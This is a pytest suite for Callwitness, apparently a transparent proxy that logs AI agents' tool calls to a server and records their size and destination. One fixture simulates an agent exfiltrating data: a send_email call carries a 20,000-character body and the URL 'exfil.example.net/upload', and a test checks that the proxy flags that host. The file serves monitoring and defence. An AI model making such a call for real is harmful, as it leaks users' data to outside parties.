"""End-to-end: the proxy must be invisible to the protocol.

This is the property the whole product rests on. If Callwitness can drop, reorder or
alter a single message, nobody should ever put it in front of a real agent.
"""

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
MOCK = ROOT / "examples" / "mock_server.py"

# Inherit the real environment and override only what we need. Replacing it
# wholesale strips SYSTEMROOT/USERPROFILE on Windows, and Python then cannot
# resolve the home directory. os.pathsep keeps PYTHONPATH correct on both.
ENV = {
    **os.environ,
    "PYTHONPATH": str(ROOT / "src"),
    "PYTHONIOENCODING": "utf-8",
}


def run_proxy(messages, home, extra_args=()):
    stdin = "".join(json.dumps(m) + "\n" for m in messages)
    proc = subprocess.run(
        [sys.executable, "-m", "callwitness.cli", "--home", str(home), "run",
         *extra_args, "--", sys.executable, str(MOCK)],
        input=stdin.encode(), capture_output=True, timeout=60,
        env=ENV,
    )
    return proc


def direct(messages):
    """The same messages sent straight to the server, with no proxy in between."""
    stdin = "".join(json.dumps(m) + "\n" for m in messages)
    proc = subprocess.run([sys.executable, str(MOCK)],
                          input=stdin.encode(), capture_output=True, timeout=60)
    return proc.stdout


CONVERSATION = [
    {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
    {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}},
    {"jsonrpc": "2.0", "id": 3, "method": "tools/call",
     "params": {"name": "send_email", "arguments": {"to": "ops@acme.com"}}},
    {"jsonrpc": "2.0", "id": 4, "method": "tools/call",
     "params": {"name": "send_email",
                "arguments": {"to": "drop@unknown.example",
                              "body": "X" * 20000,
                              "url": "https://exfil.example.net/upload"}}},
    {"jsonrpc": "2.0", "id": 5, "method": "tools/call",
     "params": {"name": "explode", "arguments": {}}},
]


def test_output_is_byte_identical_to_running_the_server_directly(tmp_path):
    proxied = run_proxy(CONVERSATION, tmp_path).stdout
    assert proxied == direct(CONVERSATION)


def test_every_request_gets_its_response(tmp_path):
    out = run_proxy(CONVERSATION, tmp_path).stdout.decode().strip().splitlines()
    ids = [json.loads(line)["id"] for line in out]
    assert ids == [1, 2, 3, 4, 5]


def test_unparseable_lines_are_still_forwarded(tmp_path):
    """Garbage in the stream is the server's problem, not ours to swallow."""
    stdin = b'not json at all\n' + json.dumps(CONVERSATION[0]).encode() + b"\n"
    proc = subprocess.run(
        [sys.executable, "-m", "callwitness.cli", "--home", str(tmp_path), "run",
         "--", sys.executable, str(MOCK)],
        input=stdin, capture_output=True, timeout=60,
        env=ENV,
    )
    assert proc.returncode == 0
    assert json.loads(proc.stdout.decode().strip())["id"] == 1


def test_calls_are_recorded_with_size_and_destination(tmp_path):
    run_proxy(CONVERSATION, tmp_path)
    import sqlite3
    con = sqlite3.connect(str(tmp_path / "callwitness.db"))
    rows = con.execute(
        "SELECT tool, args_bytes, is_error, signals_json FROM calls ORDER BY id"
    ).fetchall()
    con.close()

    assert [r[0] for r in rows] == ["send_email", "send_email", "explode"]

    small, large, failed = rows
    assert small[1] < 100
    assert large[1] > 20000
    assert failed[2] == 1

    # the contrast the whole product is about: same tool, same permission
    assert json.loads(small[3])["destinations"]["emails"] == ["ops@acme.com"]
    assert json.loads(large[3])["destinations"]["hosts"] == ["exfil.example.net"]


def test_exit_code_of_the_wrapped_server_is_propagated(tmp_path):
    proc = subprocess.run(
        [sys.executable, "-m", "callwitness.cli", "--home", str(tmp_path), "run",
         "--", sys.executable, "-c", "import sys; sys.exit(3)"],
        input=b"", capture_output=True, timeout=60,
        env=ENV,
    )
    assert proc.returncode == 3


def test_missing_server_command_fails_cleanly(tmp_path):
    proc = subprocess.run(
        [sys.executable, "-m", "callwitness.cli", "--home", str(tmp_path), "run",
         "--", "definitely-not-a-real-binary-xyz"],
        input=b"", capture_output=True, timeout=60,
        env=ENV,
    )
    assert proc.returncode == 127
    assert b"cannot start server" in proc.stderr
